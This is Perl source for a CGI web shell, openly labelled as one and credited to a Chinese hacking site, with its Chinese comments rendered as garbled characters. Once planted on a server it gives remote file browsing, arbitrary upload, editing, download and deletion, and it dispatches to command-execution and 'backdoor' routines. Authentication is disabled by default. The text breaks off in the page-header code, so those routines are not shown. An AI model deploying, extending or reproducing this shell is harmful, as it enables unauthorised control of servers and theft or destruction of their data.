   #!c:/perl/bin/perl.exe

   ######################
   ##·Çiis·þÎñÇë×ÔÐÐÐÞ¸ÄperlÂ·¾¶

   ##################################### WELCOME ##########################################
   #                                                                                      #
   #                              cgi http shell of koni version                          #
   #                                                                                      #
   #          Code by alpha from www.54hack.com/www.securityfaq.org @ China               #
   #                                                                                      #
   #           Thanks pinkeyes and lanker very much ,Thanks my parents too!               #
   #                                                                                      #
   ############################ www.54hack.com/www.securityfaq.org ########################

   use CGI qw(:all escape);
   use CGI qw/:standard/;

   ######################
   ##¹ÜÀíÔ±ÃÜÂëÉèÖÃ,iisÏÂÇéÇë²»ÓÃÃÜÂëÈÏÖ¤£¬Õâ¸öÎÊÌâ½«ÔÚÏÂÒ»°æ±¾ÖÐ½â¾ö

   $checkpass="0";#ÃÜÂëÈÏÖ¤²ÉÓÃcookie·½Ê½£¬"1"ÎªÐèÒªÈÏÖ¤£¬¸Ä³ÉÆäËüÖµÔò²»ÓÃÃÜÂëÈÏÖ¤
   $adpass="test";#¹ÜÀíÔ±ÃÜÂë£¬¿É¸Ä³ÉÄãÏ²»¶µÄ^_^

   #######################
   ##window¿ÉÐ´Ä¿Â¼ÉèÖÃ

   $wpath="c:/windows/temp"; #Çë×Ô¼ºÉèÖÃÒ»¸ö¿ÉÐ´µÄÄ¿Â¼£¬³ÌÐòÔËÐÐÊ±ÓÃµ½£¬´ËÉèÖÃ½öÓÃÓÚwindowsÏµÍ³

   ##########
   # Ò»Ð©ÏµÍ³±äÁ¿

   $uk=1;
   $tz=-0;
   $dispath=1;
   #¼¸¸öÑÕÉ«±äÁ¿
   $c1="#006600";# ±êÌâ¡¢ÒÑ·ÃÎÊµÄÁ´½ÓºÍ±ß¿ò - È±Ê¡£º°µÂÌ
   $c2="#000000";  # ÎÄ×Ö - È±Ê¡£ººÚÉ«
   $c4="#E0E0E0";  # Ö¸Ê¾/½á¹û±³¾°É« - È±Ê¡£º»ÒÉ«
   $c5="#008080";  # Ò³Ãæ±³¾°É« - È±Ê¡£ººÚÉ«
   $c6="#7F007F";  # °´Å¥±³¾°Çø (CCS) - È±Ê¡£º×ÏÉ«
   $c7="#FFFFFF";  # °´Å¥ÎÄ×Ö (CCS) - È±Ê¡£º°×É«
   $face="ËÎÌå,arial,helvetica,sans-serif"; # ×ÖÌåÉèÖÃ
   #Í¼Ïñ¼°¶þ½øÖÆÎÄ¼þÀ©Õ¹Ãû
   $imagefiles='gif|jp*g|png|bmp|ico|pdf|swf|qt|mov';

   if ($ENV{CONTENT_TYPE}=~/multipart/i) {&transParse;}
   else {&inParse;}
   $sn="$ENV{SERVER_NAME}";
   $root="$ENV{DOCUMENT_ROOT}";
   $hst="$ENV{HTTP_HOST}";
   $fnt="<FONT-FAMILY: ËÎÌå;FONT-SIZE: 12pt>";
   $fnt1="<FONT-FAMILY: ËÎÌå;FONT-SIZE: 10pt>";
   $fnt1w="<FONT-FAMILY: ËÎÌå;FONT-SIZE: 12pt><FONT COLOR=red>";
   $dcnt=0; $fcnt=0;


   ######################################
   ##ÓÃ»§µÇÂ½ÈÏÖ¤¼ì²â²¿·Ö
   if($checkpass=="1")
   {
   if (cookie('adpass') ne $adpass)
   {

       if($t{'password'} eq $adpass)
       {
           $cookie_name=cookie(-name =>'adpass',-value => $adpass);
           print header(-cookie =>$cookie_name);
           print "<meta http-equiv=\"refresh\" content=\"1;URL=\"" .$ENV{'SERVER_NAME'}.$ENV{'SCRIPT_NAME'}. ">";
           print "<html><body>Jumping.....</body></html>";
           exit;
       }
       else{
           print "Content-type: text/html\n\n";
           print "<html><body>\n";
           print <<"Wrong";
   <html>
   <style type="text/css">
   input {
           font-family: "Verdana";
           font-size: "11px";
           BACKGROUND-COLOR: "#FFFFFF";
           height: "18px";
           border: "1px solid #666666";
   }
   </style>
   <body>
   <table>
   <form action=$ENV{'SCRIPT_NAME'} method="post">
   <font style="font-size: 17px; ">pass:</font><input type="text" name="password" class="input">&nbsp;<input type="submit" value="ok" class="input">
   </form>
   </table></body></html>
   Wrong
   exit;
       }

   }
   }



   ###############################################
   ##µÇÂ½×¢Ïú²¿·Ö

   sub logout {
           $out_cookie="fkms**";
           $cookie_name1=cookie(-name =>'adpass',-value => $out_cookie);
           print header(-cookie =>$cookie_name1);
           print "<meta http-equiv=\"refresh\" content=\"1;URL=\"" .$ENV{'SERVER_NAME'}.$ENV{'SCRIPT_NAME'}. ">";
           exit;

   }


   ##########
   # ÏµÍ³ºËÐÄ²¿·Ö


   $title="ÎÄ¼þÁÐ±í";
   $t{'uk'}=$uk unless ($t{'uk'});
   $usck=" CHECKED" if ($t{'uk'}==0);
   $ukck=" CHECKED" if ($t{'uk'}==1);
   $uk=$t{'uk'};
   if (($t{'tz'}=~/\d+/)&&($t{'tz'}!=$tz)) {$tz=$t{'tz'};}
    else {$t{'tz'}=$tz;}
   $t{'dispath'}=$dispath unless ($t{'dispath'});
   $dispathck=" CHECKED" if ($t{'dispath'}==1);
   $dispath=$t{'dispath'};
   $action=$t{'action'};
   if($action)
   {if($action=="1")
       {&cmd;}
       if ($action=="2") {
           &env;
       }
       elsif($action=="3")
       {&backdoor;}
       elsif($action=="4"&&$checkpass=="1")
       {&logout;}
   }

   if (!$t{'run'}) {
       $t{'adminpro'}="$ENV{SCRIPT_NAME}";
    if (!$rut) {
     $_="$ENV{SCRIPT_FILENAME}";
     $_="$ENV{PATH_TRANSLATED}" if ($ENV{PATH_TRANSLATED});
    } else {$_="$ENV{SCRIPT_NAME}";}
    if($ENV{SERVER_SOFTWARE}=~/Microsoft/)
       {
        $_="$ENV{PATH_TRANSLATED}";
        ~s/\\/\//g;
    }
    /^(.*)\/(.+?)\.(.+?)$/;
    $path=$1; $script=$2; $ext=$3;
    $cgirootpath="$root$path";
    $cgipath=$1;
    $goinst=1;
    }
   else {
    $path="$t{'path'}";
    if ($t{'newfile'}||$t{'newdir'}||$t{'mkfile'}=~/\w+/) {&runtest;}
    elsif (!$t{'test'}) {
    $goinst=1;
    }
    else {
     if (!(-e "$rut$path$t{'test'}")) {
     $title="´íÎó - ÎÄ¼þÃ»·¢ÏÖ£¡";
     }
     elsif ($t{'save'}) {
     $title="ÎÄ¼þ \"$t{'test'}\" ÒÑ±£´æ"; &save_edited;
     }
     elsif ($t{'edit'}) {
     $title="±à¼ÎÄ±¾ÎÄ¼þ£º\"$t{'test'}\""; &edit;
     }
     elsif ($t{'rename'}) {
     $title="ÖØÃüÃû£º\"$t{'test'}\""; &rename;
     }
     elsif ($t{'download'}) {
     &download;
     }
     else {
     &runtest;
     }
    }
   }
   &result;


   ##########
   # ÖØÃüÃû²¿·Ö

   sub rename {
   $|=1;
   &head;
   print "Content-type: text/html\n\n";
   print <<"Edit_Result";
   $head<BR>
   <CENTER><FORM NAME="renameitem" ACTION="$t{'adminpro'}" METHOD=get>
   <TABLE BGCOLOR=#E0E0E7 CELLPADDING=3 CELLSPACING=0 BORDER=0 width=760><TR ALIGN=CENTER><TD>
   <FONT  COLOR=$c1>ÖØÃüÃû£º<U>$t{'test'}</U></FONT><BR>
   <INPUT TYPE=HIDDEN NAME="uk" VALUE="$t{'uk'}">
   <INPUT TYPE=HIDDEN NAME="tz" VALUE="$t{'tz'}">
   <INPUT TYPE=HIDDEN NAME="dispath" VALUE="$t{'dispath'}">
   <INPUT TYPE=HIDDEN NAME="adminpro" VALUE="$t{'adminpro'}">
   <INPUT TYPE=HIDDEN NAME="path" VALUE="$t{'path'}">
   <INPUT TYPE=HIDDEN NAME="test" VALUE="$t{'test'}">
   <INPUT TYPE=HIDDEN NAME="run" VALUE="yes">
   <INPUT TYPE=TEXT NAME="newname" VALUE="$t{'newname'}" SIZE=36 MAXLENGTH=48><BR>
   <INPUT TYPE=BUTTON VALUE="&lt; ºóÍË"  onClick="JavaScript:history.go(-1); return true;"  STYLE="font:9pt $face;color:$c7;background-color:$c6;cursor:hand;"> &nbsp;
   <INPUT TYPE=RESET VALUE="ÖØÐÂÉèÖÃ"   STYLE="font:9pt $face;color:$c2;background-color:$c7;cursor:hand;"> &nbsp;
   <INPUT TYPE=SUBMIT NAME="execute" VALUE="ÖØÃüÃû "  STYLE="font:9pt $face;color:$c7;background-color:$c1;cursor:hand;">
   </TD></TR></TABLE></FORM></CENTER>
   $foot1
   </center></BODY></HTML>
   Edit_Result
   $|=0;
   exit;
   }


   ##########
   # ÎÄ¼þ±à¼²¿·Ö

   sub edit {
   open(FILE,"$rut$path$t{'test'}");
   binmode (FILE);
   @b=<FILE>;
   close (FILE);
   while ($c=shift(@b)) {
   $c=~s/</&lt;/g;
   $c=~s/>/&gt;/g;

   #$c=~s/<(.*)?>/&lt;$1&gt;/g;
   $b.="$c";
   }
   push(@editfile,$b);
   $|=1;
   &head;
   print "Content-type: text/html\n\n";
   print <<"Edit_Result";
   $head
   <CENTER><FORM NAME="editfile" ACTION="$t{'adminpro'}" METHOD=POST>
   <TABLE BGCOLOR=#E0E0E7 CELLPADDING=3 CELLSPACING=0 BORDER=0><TR ALIGN=CENTER><TD>
   <FONT COLOR=$c1>±à¼ÎÄ±¾ÎÄ¼þ£º<U>$t{'test'}</U></FONT><BR>
   <INPUT TYPE=HIDDEN NAME="uk" VALUE="$t{'uk'}">
   <INPUT TYPE=HIDDEN NAME="tz" VALUE="$t{'tz'}">
   <INPUT TYPE=HIDDEN NAME="dispath" VALUE="$t{'dispath'}">
   <INPUT TYPE=HIDDEN NAME="adminpro" VALUE="$t{'adminpro'}">
   <INPUT TYPE=HIDDEN NAME="path" VALUE="$t{'path'}">
   <INPUT TYPE=HIDDEN NAME="test" VALUE="$t{'test'}">
   <INPUT TYPE=HIDDEN NAME="run" VALUE="yes">
   <TEXTAREA NAME="filecontent" COLS=91 ROWS=28 WRAP=OFF STYLE="font:9pt courier,monospace;">@editfile</TEXTAREA><BR>
   <INPUT TYPE=BUTTON VALUE="&lt; ºóÍË"   onClick="JavaScript:history.go(-1); return true;"  STYLE="font:9pt $face;color:$c7;background-color:$c6;cursor:hand;"> &nbsp;
   <INPUT TYPE=RESET VALUE="ÖØÐÂÉèÖÃ"  STYLE="font:9pt $face;color:$c2;background-color:$c7;cursor:hand;"> &nbsp;
   <INPUT TYPE=SUBMIT NAME="save" VALUE="±£´æ£º$t{'test'}"  STYLE="font:9pt $face;color:$c7;background-color:$c1;cursor:hand;">
   </TD></TR></TABLE>
   </FORM></CENTER>
   $foot1
   </center></BODY></HTML>
   Edit_Result
   $|=0;
   exit;
   }


   ##########
   # ±£´æ±à¼½á¹û²¿·Ö

   sub save_edited {
   open (FILE,">$t{'path'}$t{'test'}");
   binmode (FILE);
   $t{'filecontent'}=~s/[\r\n]{2}/\n/g;
   #$FORM{'filecontent'}=~s/[\r\n]{2}/\n/g;
   print FILE "$t{'filecontent'}";
   close (FILE);
   }


   ##########
   # ÎÄ¼þÏÂÔØ²¿·Ö

   sub download {
   open(FILE,"$rut$path$t{'test'}");
   binmode (FILE);
   @b=<FILE>;
   close (FILE);
   while ($c=shift(@b)) {$b.="$c";}
   push(@dl,$b);
   $|=1;
   print "Content-Type: application/download
   Content-Disposition: attachment; filename=$t{'test'}\n\n";
   print @dl;
   $|=0;
   exit;
   }


   ##########
   # ½¨Á¢ÐÂÄ¿Â¼£¬½¨Á¢ÐÂÎÄ¼þ£¬É¾³ý»ò²âÊÔÓï·¨²¿·Ö

   sub runtest {

   if ($t{'mkfile'})
       {
        if (-e "$rut$path$t{'mkfile'}")
        {
            $title="Ê§°Ü£º$t{'mkfile'} ÒÑ´æÔÚ¡£";
       } else
           {
           open(file,">$path$t{'mkfile'}");
           close(file);
           }
       if (-e "$rut$path$t{'mkfile'}") {
       $title="³É¹¦£º$t{'mkfile'} ´´½¨Íê³É¡£";
       }
       else
           { $title="Ê§°Ü£º$t{'mkfile'} ´´½¨Íê³É¡£";}
    }

    if ($t{'newname'}) {
     if ($t{'newname'} eq $t{'test'}) {
    $title="Ê§°Ü£º$t{'newname'} ºÍÐÞ¸ÄÇ°ÏàÍ¬¡£";
    } elsif (-e "$rut$path$t{'newname'}") {
    $title="Ê§°Ü£º$t{'newname'} ÒÑ´æÔÚ¡£";
    } else {
     rename("$rut$path$t{'test'}","$rut$path$t{'newname'}");
     if (-e "$rut$path$t{'newname'}") {
    $title="³É¹¦£º$t{'test'} ÒÑ±»ÖØÃüÃûÎª£º$t{'newname'}";
      }
     }
    } elsif ($t{'newdir'}=~/\w+/) {
     if (-e "$rut$path$t{'newdir'}") {
    $title="Ê§°Ü£º$t{'newdir'} ÒÑ´æÔÚ¡£";
    } else {
     mkdir("$rut$path$t{'newdir'}",0777);
     if (-e "$rut$path$t{'newdir'}") {
    $title="³É¹¦£º$t{'newdir'} ´´½¨Íê³É¡£";
      }
     }
    } elsif ($t{'newfile'}) {&write_file;
    }




    elsif ($t{'delete'}) {
    unlink("$rut$path$t{'test'}");
     if (-e "$rut$path$t{'test'}") {
    $title="Ê§°Ü£ºÎÞ·¨É¾³ý $t{'test'}"; undef($t{'test'});
     }
    else {
    $title="³É¹¦£ºÒÑ½« $t{'test'} É¾³ý¡£"; undef($t{'test'});
     }
    }
    elsif ($t{'remove'}) {
    rmdir("$rut$path$t{'test'}");
     if (-e "$rut$path$t{'test'}") {
    $title="Ê§°Ü£ºÎÞ·¨É¾³ý $t{'test'},¿ÉÄÜÄ¿Â¼·Ç¿Õ"; undef($t{'test'});
     }
     else {
     $title="³É¹¦£ºÒÑ½« $t{'test'} É¾³ý"; undef($t{'test'});
     }
    }
   elsif (!$t{'chmod'}&&!$t{'newdir'}&&!$t{'newfile'}&&!$t{'newname'}&&!$t{'mkfile'}) {
   $title="ÎÞ·¨´¦ÀíÇëÇó";
    }
   }


   ##########
   # Êä³öHTML½á¹û²¿·Ö

   sub result {
   &viewDir;
   &head;
   $foot="</FONT></BODY></HTML>\n";
   $|=1;
   print "Content-type: text/html\n\n";

   print<<"Print_Result";

   $head
   <CENTER>
   <TABLE WIDTH="760" CELLPADDING=3 CELLSPACING=0 BORDER=0 bgcolor="#E0E0E7">
   <TR ALIGN=CENTER VALIGN=TOP bgcolor="#cccccc">
   <TD WIDTH=100% ALIGN=CENTER NOWRAP><NOBR>$fnt1w$title</FONT></NOBR></TD>
   </TR>

   <tr ALIGN=CENTER width=100%><td colspan="6" height="2"></td></tr></table>

   <TABLE  CELLPADDING=2 CELLSPACING=2 BORDER=0 width=760 bgcolor="#E0E0E7">$return
   <TR VALIGN=BOTTOM width=100%><TD COLSPAN=5 NOWRAP>$fnt1<FONT COLOR=$c1>$dhd/&nbsp;$fhd</TD></TR>
   <TR VALIGN=BOTTOM width=100% bgcolor="#bbcccc"><TD  NOWRAP>
   $fnt1<FONT COLOR=$c1>&nbsp;&nbsp;ÎÄ¼þ&nbsp; </FONT></TD><TD COLSPAN=1 ALIGN=CENTER NOWRAP>
   $fnt1<FONT COLOR=$c1>&nbsp;²Ù×÷&nbsp;</FONT></TD><TD ALIGN=CENTER NOWRAP>
   $fnt1<FONT COLOR=$c1>&nbsp;´óÐ¡&nbsp;</FONT></TD><TD  ALIGN=CENTER NOWRAP>
   $fnt1<FONT COLOR=$c1>&nbsp;¸üÐÂÊ±¼ä&nbsp;</FONT></TD><TD NOWRAP ALIGN=CENTER>$fnt1<FONT COLOR=$c1>&nbsp;ÊôÐÔ</FONT></TD></TR>
   $directorydata

   $filedata
   </TABLE></TD></TR>

   </CENTER><BR>
   $foot1
   $foot

   Print_Result
   $|=0;
   }

   ##########
   # ÊäÈë×ª»»

   sub transParse {
   $upload++;
   #my $req=new CGI;$req->
   ($t{'path'}=param("path"))=~s/\/+/\//g;
   $t{'adminpro'}=param("adminpro");
   $t{'uk'}=param("uk");
   $t{'tz'}=param("tz");
   $t{'dispath'}=param("dispath");
   $t{'run'}=param("run");
   #$t{'newfile'}=param("newfile");
   $t{'newdir'}=param("newdir");
   $t{'bind_pass'}=param("bind_pass");
   $t{'mkfile'}=param("mkfile");
   $t{'action'}=param("action");
   #$t{'password'}=param("password");
   $t{'newfile'}=param("newfile");
   $t{'password'}=param('password');
   }


   ##########
   # ÎÄ¼þÉÏ´«¼ì²â²¿·Ö

   sub write_file {


   my $file = param("newfile");
   if ($file ne "") {
   my $fileName = $file;
   $fileName =~ s/^.*(\\|\/)//; #ÓÃÕýÔò±í´ïÊ½È¥³ýÎÞÓÃµÄÂ·¾¶Ãû£¬µÃµ½ÎÄ¼þÃû
   open (OUTFILE, ">$rut$t{'path'}$fileName");
   binmode(OUTFILE); #Îñ±ØÈ«ÓÃ¶þ½øÖÆ·½Ê½£¬ÕâÑù¾Í¿ÉÒÔ·ÅÐÄÉÏ´«¶þ½øÖÆÎÄ¼þÁË¡£¶øÇÒÎÄ±¾ÎÄ¼þÒ²²»»áÊÜ¸ÉÈÅ
   while (my $bytesread = read($file, my $buffer, 1024)) {
   print OUTFILE $buffer;
   }
   close (OUTFILE);
   }

   $newfile=$t{'newfile'};
    if (!$newfile) { $title="ÉÏ´«Ê§°Ü";
    }
    elsif ($flg) {$title="$newfile ÉÏ´«Ê§°Ü";
    }
    elsif (-e "$rut$path$filename") {$title="$newfile ÉÏ´«³É¹¦";
    }
    else {$title="$newfile ÉÏ´«Ê§°Ü";
    }
   }


   ##########
   # µ±Ç°Ä¿Â¼ÖÐµÄÎÄ¼þÕªÒª²¿·Ö

   sub viewDir {
   $hide='\.\.?$';

   $return="<TR VALIGN=TOP><TD COLSPAN=8 NOWRAP><font color=red SIZE=2.5>&nbsp;µ±Ç°Â·¾¶:";

    if (length($path)>1)
        {
     ($path.="/")=~s/\/+/\//g;
       #$path=substr($path,0);
     @dirs=split(/\//,$path);
     $curdir=pop(@dirs);
      foreach $dir(@dirs) {
       if($dir=~/:/)
          {$w.="$dir"}
       else{
      $w.="/$dir";
      }
      $w=~s/\/+/\//g;
       if (length($w)>1) {$return.="/<A HREF=\"$t{'adminpro'}?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($w)."&run=yes\" onMouseOver=\"window.status='È¥ \\'$dir\\' Ä¿Â¼'; return true;\" onMouseOut=\"window.status=''; return true;\" TITLE=\"µã»÷ÕâÀïÈ¥ '$dir' Ä¿Â¼\" STYLE=\"cursor:w-resize;\">$dir</A>";

      }
     }
    }
    if ($curdir) {$return.="/$curdir"; $return.="/$fnt1<BR>&nbsp;</FONT></FONT></TD></TR>\n\n";}
    else {$curdir="·þÎñÆ÷¸ù"; undef($return);}
    opendir (DIR,"$rut$path");
    @allfiles=grep(!/^$hide/,readdir(DIR));
    push(@allfiles,(readlink(DIR))) unless (!(readlink(DIR)));
    foreach $file(@allfiles) {
     $alf="<!- ".lc($file)." ->";
    $a="A";
    @filestats=stat("$rut$path$file");
     if (!$filestats[2]) {@filestats=lstat("$rut$path$file");
       $i="<I>"; $l=" <FONT COLOR=#909090>(Á´½Ó)</FONT>";}
    $size=sprintf("%.1f",($filestats[7])/1024);
     if (($size<1)&&($size>0)) {$size="$filestats[7] b";}
      else {$size.=" k";}
     if ($size=="0.0 k") {$size="0 b";}
    $datemod=$filestats[9]; &date;
    ($fileperm=sprintf("%.0o",$filestats[2]))=~s/.*(.{3})$/$1/;
     if (!$filestats[2]) {$fileperm="<FONT COLOR=#808080>n/a</FONT>"; $a="! A"; $dis++;}
     else {
   if (!$disablechmod) {
   $set0=" document.adminpro.chmod.value=''; setperms();";
   $set1=" document.adminpro.chmod.value=$fileperm; setperms();";
     }
    }
    # Èç¹ûËüÊÇÒ»¸öÄ¿Â¼
    if ((-d "$file")||($filestats[2]=~/^(16|17|41)/)) {
    $deldir="$trd";

    $deldir="<A HREF=\"$t{'adminpro'}"."?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($path)."&test=".escape($file)."&remove=yes&run=yes\" onClick=\"return verify('$file');\" >del</A>" if (!@subfiles);

   push (@dlist,"$alf<TR VALIGN=TOP width=100%><TD NOWRAP>$fnt1$i&nbsp;<A HREF=\"$t{'adminpro'}"."?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($path).escape($file)."%2F&run=yes\" ><font color=\"\#006699\">[$file]</font></A></TD>
   <TD ALIGN=CENTER NOWRAP><$a HREF=\"$t{'adminpro'}"."?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($path)."&test=".escape($file)."&rename=yes&run=yes\"  STYLE=\"cursor:text;\">ÖØÃüÃû</A>$l|$deldir</TD><TD ALIGN=CENTER>$fnt1 &lt;dir&gt;</TD>$filelastmod<TD ALIGN=CENTER NOWRAP>$fnt1$i$fileperm</TD></TR>\n");}

    # Èç¹ûËü²»ÊÇÒ»¸öÄ¿Â¼
    else {$a="A"; $tr=$tra; $do=$doc; $dl=$dla; $ex=$exa;
    if ($ENV{SCRIPT_NAME}=~/$file/) {
     $a="! A"; $tr=$trd; $do=$dod; $dl=$dld; $ex=$exd;
     }
    if ($file=~/\.($imagefiles)$/i) {$ficon=$img;}
    else {$ficon=$do;}
   push (@flist,"$alf<TR VALIGN=TOP width=100%><TD NOWRAP width=20%>$fnt1$i&nbsp;<$a HREF=\"$t{'adminpro'}"."?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($path)."&test=".escape($file)."&rename=yes&run=yes\" STYLE=\"cursor:text;\">$file</A>$l&nbsp;</TD>
   <TD ALIGN=CENTER NOWRAP width=20%>$fnt1<$a HREF=\"$t{'adminpro'}"."?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($path)."&test=".escape($file)."&edit=yes&run=yes\">±à¼</A>
   |$fnt1<$a HREF=\"$t{'adminpro'}"."?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($path)."&test=".escape($file)."&download=yes&run=yes\" TARGET=\"edit\" >ÏÂÔØ</A>&nbsp|<$a HREF=\"$t{'adminpro'}"."?uk=$t{'uk'}&tz=$t{'tz'}&dispath=$t{'dispath'}&adminpro=$t{'adminpro'}&path=".escape($path)."&test=".escape($file)."&delete=yes&run=yes\"  onClick=\"return verify('$file');\" >É¾³ý</A></TD>
   <TD ALIGN=RIGHT NOWRAP width=20%>$i$fnt1$size &nbsp&nbsp&nbsp</TD>\n<TD NOWRAP width=20% ALIGN=CENTER>$fnt1$i &nbsp; $moda-$yr | $hourmin</TD>\n<TD ALIGN=CENTER NOWRAP width=20%>$fnt1$i$fileperm</TD></TR>\n");}

   undef($i); undef($l);
    }
   closedir (DIR);

   $hidden="<INPUT TYPE=HIDDEN NAME=\"adminpro\" VALUE=\"$t{'adminpro'}\"><INPUT TYPE=HIDDEN NAME=\"path\" VALUE=\"$path\">\n<INPUT TYPE=HIDDEN NAME=\"run\" VALUE=\"execute\">\n<INPUT TYPE=HIDDEN NAME=\"newdir\">\n";
   #newdirÐÂ½¨ÎÄ¼þ¼ÐÓÃ
   $newfil="<tr  width=100% bgcolor=#ffffff><td colspan=\"6\" height=\"5\"></td></tr><TR><TD COLSPAN=7 NOWRAP><NOBR><FORM NAME=\"dirform\" ACTION=\"$t{'adminpro'}\" METHOD=GET>$hidden$fnt1ÐÂ½¨ÎÄ¼þ¼Ð£º<INPUT TYPE=TEXT NAME=\"newdir\" SIZE=18 STYLE=\"font:9pt;\"  document.adminpro.test.value=this.value; document.adminpro.syntax.checked=0;$set0 return false;\" onKeyUp=\"document.adminpro.test.value=this.value; document.adminpro.newdir.value=this.value; return false;\" class=\"input\"></NOBR>&nbsp;<INPUT TYPE=SUBMIT  VALUE=\"È·¶¨\" class=\"input\"  ></TD><TD width=0></FORM></TD></TR>\n\n
   <TR><TD COLSPAN=7 NOWRAP BGCOLOR=\"#CCCCCC\"><NOBR><FORM NAME=\"dirform\" ACTION=\"$t{'adminpro'}\" METHOD=GET>$hidden$fnt1ÐÂ½¨ÎÄ¼þ&nbsp;&nbsp;£º<INPUT TYPE=TEXT NAME=\"mkfile\" SIZE=18 STYLE=\"font:9pt;\"  document.adminpro.test.value=this.value; document.adminpro.syntax.checked=0;$set0 return false;\" onKeyUp=\"document.adminpro.test.value=this.value; document.adminpro.newdir.value=this.value; return false;\" class=\"input\"></NOBR>&nbsp;<INPUT TYPE=SUBMIT  VALUE=\"È·¶¨\" class=\"input\"></TD><TD width=0></FORM></TD></TR>
   <TR><TD COLSPAN=7 NOWRAP><NOBR><FORM method=\"POST\" NAME=\"filform\" ACTION=\"$t{'adminpro'}\" ENCTYPE=\"multipart/form-data\" >$hidden$fnt1<input type=\"hidden\" name=action value=5>$fnt1ÉÏ´«ÎÄ¼þ:<INPUT TYPE=FILE NAME=\"newfile\" SIZE=12 MAXLENGTH=80  class=\"input\">&nbsp;<INPUT TYPE=SUBMIT NAME=\"run\" VALUE=\"ÉÏ´«\" class=\"input\"></TD><TD></form></NOBR></TD>
   </TR>\n\n";
   #$dcnt£¬$fcntÎªÎÄ¼þ¼ÐºÍÎÄ¼þ¸öÊý
    $dcnt=@dlist; $fcnt=@flist;
    @dlist=sort(@dlist);
    @flist=sort(@flist);
    if ($dcnt<1) {
   $directorydata="<TR><TD COLSPAN=8>$fnt1 &nbsp;</TD></TR>\n\n";
    } else {
    $d1=1;
      foreach $dlist(@dlist) {
       if ($d1==1) {$alt1=" BGCOLOR=#CCCCCC"; $d1--;}
       else {undef($alt1); $d1++;}
      $dlist=~s/<TR/<TR$alt1/g;
      $directorydata.=$dlist;
      }
   $directorydata.="<TR><TD COLSPAN=8>$fnt1 &nbsp;</TD></TR>\n\n";
      }
    if ($fcnt<1) {$filedata="$newfil";
    } else {$f1=1; push(@flist,$newfil);
      foreach $flist(@flist) {
       if ($f1==1) {$alt2=" BGCOLOR=#CCCCCC"; $f1--;}
       else {undef($alt2); $f1++;}
      $flist=~s/<TR/<TR$alt2/g;
      $filedata.=$flist;}
      }
    if ($dcnt==1) {$dhd="&nbsp;$dcnt ¸öÄ¿Â¼";}
     else {$dhd="&nbsp;$dcnt ¸öÄ¿Â¼";}
    if ($fcnt==1) {$fhd="$fcnt ¸öÎÄ¼þ";}
     else {$fhd="$fcnt ¸öÎÄ¼þ";}

    $tot=($dcnt+$fcnt);
    if ($dis==$tot) {
   $disablechmod=" ";

   }

   }


   ##########
   # ÈÕÆÚ¼ÆËã²¿·Ö

   sub date {
    $datemod=$datemod+($tz*3600);
    ($se,$mn,$ho,$da,$mo,$yr)=localtime($datemod);
    $mo=($mo+1); $yr=($yr+1900);
     if ($ho>=12) {$ampm="pm";} else {$ampm="am";}
     if ($ho<1) {$ho=12;}
     if ($ho>=13) {$ho=($ho-12);}
    $mo=sprintf("%02.0f",$mo);
    $ho=sprintf("%02.0f",$ho);
    $mn=sprintf("%02.0f",$mn);
    $se=sprintf("%02.0f",$se);
    $hourmin="$ho:"."$mn:$se"."&nbsp;$ampm";
    $da=sprintf("%02.0f",$da);
    $moda="$mo-$da";
    $filelastmod="<TD NOWRAP ALIGN=CENTER>$fnt1$i &nbsp $moda-$yr |  $hourmin</TD>";
   }

   ##########
   # ½âÎö²¿·Ö

   sub inParse {

       binmode(STDIN);
       binmode(STDOUT);
       binmode(STDERR);
    $method=$ENV{REQUEST_METHOD};
    if ($method=~/get/i) {
    $buffer=$ENV{QUERY_STRING};
    } elsif ($method=~/post/i) {
     read (STDIN,$buffer,$ENV{CONTENT_LENGTH});
    }



   ##########
   # Æ¥Åä×Ö·ûºÍÖµ²¿·Ö

    @pairs=split(/&/,$buffer);
    foreach $pair(@pairs) {
     ($name, $value)=split(/=/,$pair);
     $value=~tr/+/ /;
     $value=~s/%([a-fA-F0-9][a-fA-F0-9])/pack("C",hex($1))/eg;
     if ($method!~/post/i) {
     $value=~s/\s+/ /g;
     $value=~s/´|“|”|’|Õ|Ô/'/g;
     $value=~s/\*|\!|\+|\$|\^|\#|\%//g;
     $value=~s/\?/%3F/g;
     }
     $t{$name}=$value;
    }
   }

   ##########
   # Ò³Ê×²¿·Ö

   sub head {
   if(($ENV{SERVER_SOFTWARE}=~/Win32/)||($ENV{SERVER_SOFTWARE}=~/Microsoft/))
       {$os="Windows";}
   else
       {$os="*nix";}

   if(!$path)
       {


   if($ENV{SERVER_SOFTWARE}=~/Microsoft/)
       {
        $_= $ENV{PATH_TRANSLATED};
       ~s/\\/\//g;
       /^(.*)\/(.+?)\.(.+?)$/;
       $path=$1;
    }
    else{
        $_="$ENV{SCRIPT_FILENAME}";
       /^(.*)\/(.+?)\.(.+?)$/;
       $path=$1;
    }


       }
   if($ENV{SERVER_SOFTWARE}=~/Microsoft/)
       {
        $filepat= $ENV{PATH_TRANSLATED};
    }
    else{
        $filepat=$ENV{SCRIPT_FILENAME};
    }

   $head=<<"Head";

   <HTML><HEAD><TITLE>cgi webshell(AlphaÖÆ×÷) | $title</TITLE>
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312">

   <SCRIPT LANGUAGE="JavaScript">
   <!---// Begin script
   function verify(file) {
    if (confirm('³¹µ×É¾³ý\\n     ' + file + '\\nÄãÄÜÈ·¶¨Âð£¿')) {return true;}
    else {alert('¶Ô\\n     ' + file + '\\nµÄÉ¾³ý²Ù×÷ÒÑÈ¡Ïû¡£'); return false;}
   }
   function getFilName() {
       var filName;
       var filPath=document.filform.newfile.value;
       var i=filPath.length-1;
       while((i>=0)&&(filPath.charAt(i)!="/")) {i--;}
       filName=filPath.substring(i+1,filPath.length);
       return filName;
   }
   // end script -->
   </SCRIPT>

   <STYLE TYPE="text/css">
   TD {font:9pt $face;}
   .INPUT {
